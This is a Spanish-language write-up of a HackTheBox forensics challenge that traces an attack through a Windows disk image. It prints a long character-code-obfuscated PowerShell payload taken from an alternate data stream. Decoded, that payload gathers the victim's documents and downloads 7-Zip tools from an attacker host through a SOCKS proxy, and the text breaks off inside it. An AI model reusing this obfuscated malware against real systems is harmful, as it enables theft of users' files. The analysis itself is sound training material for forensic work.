---
title: Artifact Of Dangerous Sighting
description: >
  HackTheBox Forensics Challenge - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/Artifact%2520Of%2520Dangerous%2520Sighting)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","easy", "deobfuscation"]
---

---
# Enunciado del problema

Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces...

---
# Resolución

Nos encontramos con un archivo con extesión: *.vhdx*, intentamos hacer un comando file, pero nos salta un error

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510105210.png)

Esto me suena a que va a ser un error de los magic numbers, pero para tener más información del archivo investigo un poco acerca de la extensión y es un archico de images de discord en fomrate de archivo **Virtual Hard Disk v2**, en pocas palabras, como nos dice el enunciado del problema. es un dump de la máquina virtual *windows* que nos comentaban anteriormente.

Como es una máquina windows busque como montar el disco duro y me pedian instalar el comando: *guestmount*:

```bash
sudo apt-get install libguestfs-tools
```

Una vez instalado ejecutaremos el siguiente comando:

```bash
guestmount --add 2023-03-09T132449_PANDORA.vhdx --inspector --ro /mnt/pandora
```

Mr.Google no es perfecto, sino todo el mundo seria forense/pentester y vemos que nos aparece un error:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510110324.png)

La propia herramienta nos esta diciendo que si estamos usando el argumento: *-i/--inspector* con el comando *guestmount*, pongamos el tipo de filesystem del archivo, ya que la herramienta no lo detecto. Para asegurar que tipos de formato de archivos soporta la herramienta podemos ver su manual de ayuda de la terminal, estabamos buscando carbon y encontramos oro. Nos pone un ejemplo de una máquina windows sin modificaciones:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510110658.png)

Haciendo caso a la herramienta pobramos ese comando, pero nada, tras media hora probando busque otra manera y windows te lo monta automaticamente, metiendonos a la carpeta del user, podemos ver el registro de comandos de la victima:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510113449.png)

Si vamos al directorio indicado en la primera linea del registro, nos encontraremos el comando donde metio un payload:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510113839.png)

Copiaremos este archivo y lo llevaremos a nuestro entorno de trabajo, aprovechando windows hare un *Ctrl + C*, si estas en windows mete un *cp*, verificamos con el comando *file* que es un ddl, y también vemos que la máquina victima es un windows 7, con esto podriamos montar el disco, sin problema, al finalizar el challenge lo probaremos...

En un log de antivirus también vemos que esta el *.dll* copiado, verificando que tiene algo que ver con el reto y que estamos en el buen camino, tambien como otro dato vemos que esta relacionado con *base64* aunque no se puede afirmar nada.

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510114850.png)

Como tengo un nivel bajo de reversing y lo he tocado 2 veces con los *.dll* decidi hacer un strings y ver por encima el archivo, encontre un apartado que me resulta curioso, donde llama a un archivo compartido llamado: *policystore.cpp*

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510115140.png)

Como sabia que este reto era *Easy* pensaba que me estaba complicando, entonces desde powershell decidi hacer un cat con la "extensión" de los `:hidden.ps1` y me salio un comando curioso, y en base64...
Por varios problemas de optimización, casi me peta el pc en pocas palabras dejare los archivos en el mismo directorio que este post...

Tendremos [[hidden.ps1]] que podremos hacerle un base64 decode y nos dara un código de powershell encodeado [[powershellencoded]], sinceramente no recomiendo abrirlo si tienes mal pc, estas compartiendo pantalla, o tienes muchos procesos abiertos, para los curiosos aqui una foto:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510120915.png)

Y si tu lo abres verás algo tal que asi:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510121008.png)


Si nos fijamos esta creando unas variables... pero tras unas horillas decidi ir a lo simple y hacerle un strings, porque al final, es un formato de binario, y quiero ver algo más legible. al hacerlo ¡bingo! Hay un código que tiene pinta de ser una cadena de texto con un metodo Reordering: [[Obfuscating Powershell]]... Aqui el código:

```powershell
$x = "[char]35 + [char]35 + [char]35 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]43 + [char]32 + [char]32 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]46 + [char]32 + [char]46 + [char]95 + [char]95 + [char]95 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]95 + [char]95 + [char]95 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]32 + [char]95 + [char]34 + [char]46 + [char]94 + [char]32 + [char]46 + [char]94 + [char]32 + [char]94 + [char]46 + [char]32 + [char]32 + [char]39 + [char]46 + [char]46 + [char]32 + [char]58 + [char]34 + [char]45 + [char]95 + [char]46 + [char]32 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]58 + [char]46 + [char]46 + [char]47 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]94 + [char]32 + [char]32 + [char]58 + [char]46 + [char]58 + [char]92 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]32 + [char]43 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]47 + [char]58 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]95 + [char]32 + [char]58 + [char]58 + [char]58 + [char]47 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]45 + [char]32 + [char]58 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]47 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]32 + [char]58 + [char]32 + [char]46 + [char]58 + [char]46 + [char]124 + [char]46 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]58 + [char]58 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]58 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]45 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]58 + [char]32 + [char]32 + [char]58 + [char]58 + [char]124 + [char]46 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]58 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]92 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]43 + [char]32 + [char]58 + [char]58 + [char]32 + [char]58 + [char]32 + [char]45 + [char]46 + [char]58 + [char]92 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]43 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]92 + [char]46 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]46 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]58 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]46 + [char]58 + [char]46 + [char]46 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]32 + [char]32 + [char]45 + [char]58 + [char]58 + [char]58 + [char]58 + [char]46 + [char]92 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]124 + [char]32 + [char]124 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]45 + [char]58 + [char]46 + [char]34 + [char]58 + [char]46 + [char]58 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]45 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]58 + [char]32 + [char]46 + [char]58 + [char]58 + [char]58 + [char]46 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]46 + [char]46 + [char]46 + [char]58 + [char]58 + [char]95 + [char]58 + [char]46 + [char]46 + [char]58 + [char]92 + [char]32 + [char]32 + [char]32 + [char]95 + [char]95 + [char]95 + [char]32 + [char]32 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]46 + [char]32 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]58 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]58 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]43 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]32 + [char]46 + [char]58 + [char]46 + [char]124 + [char]92 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]83 + [char]67 + [char]82 + [char]73 + [char]80 + [char]84 + [char]32 + [char]84 + [char]79 + [char]32 + [char]68 + [char]69 + [char]76 + [char]65 + [char]89 + [char]32 + [char]72 + [char]85 + [char]77 + [char]65 + [char]78 + [char]32 + [char]82 + [char]69 + [char]83 + [char]69 + [char]65 + [char]82 + [char]67 + [char]72 + [char]32 + [char]79 + [char]78 + [char]32 + [char]82 + [char]69 + [char]76 + [char]73 + [char]67 + [char]32 + [char]82 + [char]69 + [char]67 + [char]76 + [char]65 + [char]77 + [char]65 + [char]84 + [char]73 + [char]79 + [char]78 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]83 + [char]84 + [char]65 + [char]89 + [char]32 + [char]81 + [char]85 + [char]73 + [char]69 + [char]84 + [char]32 + [char]45 + [char]32 + [char]72 + [char]65 + [char]67 + [char]75 + [char]32 + [char]84 + [char]72 + [char]69 + [char]32 + [char]72 + [char]85 + [char]77 + [char]65 + [char]78 + [char]83 + [char]32 + [char]45 + [char]32 + [char]83 + [char]84 + [char]69 + [char]65 + [char]76 + [char]32 + [char]84 + [char]72 + [char]69 + [char]73 + [char]82 + [char]32 + [char]83 + [char]69 + [char]67 + [char]82 + [char]69 + [char]84 + [char]83 + [char]32 + [char]45 + [char]32 + [char]70 + [char]73 + [char]78 + [char]68 + [char]32 + [char]84 + [char]72 + [char]69 + [char]32 + [char]82 + [char]69 + [char]76 + [char]73 + [char]67 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]71 + [char]79 + [char]32 + [char]65 + [char]76 + [char]76 + [char]73 + [char]69 + [char]78 + [char]83 + [char]32 + [char]65 + [char]76 + [char]76 + [char]73 + [char]65 + [char]78 + [char]67 + [char]69 + [char]32 + [char]33 + [char]33 + [char]33 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]80 + [char]97 + [char]115 + [char]115 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]61 + [char]64 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]54 + [char]53 + [char]46 + [char]46 + [char]57 + [char]48 + [char]124 + [char]102 + [char]111 + [char]114 + [char]101 + [char]97 + [char]99 + [char]104 + [char]45 + [char]111 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]123 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]43 + [char]61 + [char]91 + [char]99 + [char]104 + [char]97 + [char]114 + [char]93 + [char]36 + [char]95 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]110 + [char]117 + [char]109 + [char]61 + [char]64 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]52 + [char]56 + [char]46 + [char]46 + [char]53 + [char]55 + [char]124 + [char]102 + [char]111 + [char]114 + [char]101 + [char]97 + [char]99 + [char]104 + [char]45 + [char]111 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]123 + [char]36 + [char]110 + [char]117 + [char]109 + [char]43 + [char]61 + [char]91 + [char]99 + [char]104 + [char]97 + [char]114 + [char]93 + [char]36 + [char]95 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]36 + [char]110 + [char]117 + [char]109 + [char]32 + [char]43 + [char]32 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]32 + [char]124 + [char]32 + [char]83 + [char]111 + [char]114 + [char]116 + [char]45 + [char]79 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]32 + [char]123 + [char]71 + [char]101 + [char]116 + [char]45 + [char]82 + [char]97 + [char]110 + [char]100 + [char]111 + [char]109 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]45 + [char]106 + [char]111 + [char]105 + [char]110 + [char]32 + [char]39 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]114 + [char]101 + [char]116 + [char]117 + [char]114 + [char]110 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]59 + [char]32 + [char]10 + [char]125 + [char]10 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]119 + [char]104 + [char]101 + [char]114 + [char]101 + [char]32 + [char]47 + [char]114 + [char]32 + [char]36 + [char]101 + [char]110 + [char]118 + [char]58 + [char]85 + [char]83 + [char]69 + [char]82 + [char]80 + [char]82 + [char]79 + [char]70 + [char]73 + [char]76 + [char]69 + [char]32 + [char]42 + [char]46 + [char]112 + [char]100 + [char]102 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]120 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]32 + [char]42 + [char]46 + [char]116 + [char]120 + [char]116 + [char]32 + [char]42 + [char]46 + [char]99 + [char]115 + [char]118 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]108 + [char]32 + [char]42 + [char]46 + [char]112 + [char]104 + [char]112 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]61 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]115 + [char]32 + [char]45 + [char]115 + [char]112 + [char]108 + [char]105 + [char]116 + [char]32 + [char]39 + [char]92 + [char]114 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]114 + [char]101 + [char]116 + [char]117 + [char]114 + [char]110 + [char]32 + [char]36 + [char]76 + [char]105 + [char]115 + [char]116 + [char]59 + [char]10 + [char]125 + [char]10 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]99 + [char]111 + [char]109 + [char]112 + [char]114 + [char]101 + [char]115 + [char]115 + [char]40 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]41 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]116 + [char]109 + [char]112 + [char]32 + [char]61 + [char]32 + [char]36 + [char]101 + [char]110 + [char]118 + [char]58 + [char]84 + [char]69 + [char]77 + [char]80 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]104 + [char]116 + [char]116 + [char]112 + [char]115 + [char]58 + [char]47 + [char]47 + [char]114 + [char]101 + [char]108 + [char]105 + [char]99 + [char]45 + [char]114 + [char]101 + [char]99 + [char]108 + [char]97 + [char]109 + [char]97 + [char]116 + [char]105 + [char]111 + [char]110 + [char]45 + [char]97 + [char]110 + [char]111 + [char]110 + [char]121 + [char]109 + [char]111 + [char]117 + [char]115 + [char]46 + [char]97 + [char]108 + [char]105 + [char]101 + [char]110 + [char]58 + [char]49 + [char]51 + [char]51 + [char]55 + [char]47 + [char]112 + [char]114 + [char]111 + [char]103 + [char]47 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]61 + [char]32 + [char]36 + [char]115 + [char]32 + [char]43 + [char]32 + [char]39 + [char]55 + [char]122 + [char]46 + [char]100 + [char]108 + [char]108 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]61 + [char]32 + [char]36 + [char]115 + [char]32 + [char]43 + [char]32 + [char]39 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]61 + [char]32 + [char]39 + [char]34 + [char]39 + [char]43 + [char]36 + [char]116 + [char]109 + [char]112 + [char]43 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]100 + [char]108 + [char]108 + [char]34 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]61 + [char]32 + [char]39 + [char]34 + [char]39 + [char]43 + [char]36 + [char]116 + [char]109 + [char]112 + [char]43 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]34 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]99 + [char]117 + [char]114 + [char]108 + [char]32 + [char]45 + [char]115 + [char]32 + [char]45 + [char]120 + [char]32 + [char]115 + [char]111 + [char]99 + [char]107 + [char]115 + [char]53 + [char]104 + [char]58 + [char]47 + [char]47 + [char]108 + [char]111 + [char]99 + [char]97 + [char]108 + [char]104 + [char]111 + [char]115 + [char]116 + [char]58 + [char]57 + [char]48 + [char]53 + [char]48 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]45 + [char]111 + [char]32 + [char]36 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]99 + [char]117 + [char]114 + [char]108 + [char]32 + [char]45 + [char]115 + [char]32 + [char]45 + [char]120 + [char]32 + [char]115 + [char]111 + [char]99 + [char]107 + [char]115 + [char]53 + [char]104 + [char]58 + [char]47 + [char]47 + [char]108 + [char]111 + [char]99 + [char]97 + [char]108 + [char]104 + [char]111 + [char]115 + [char]116 + [char]58 + [char]57 + [char]48 + [char]53 + [char]48 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]45 + [char]111 + [char]32 + [char]36 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]69 + [char]120 + [char]116 + [char]101 + [char]110 + [char]115 + [char]105 + [char]111 + [char]110 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]42 + [char]46 + [char]112 + [char]100 + [char]102 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]120 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]32 + [char]42 + [char]46 + [char]116 + [char]120 + [char]116 + [char]32 + [char]42 + [char]46 + [char]99 + [char]115 + [char]118 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]108 + [char]32 + [char]42 + [char]46 + [char]112 + [char]104 + [char]112 + [char]39 + [char]59 + [char]10 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 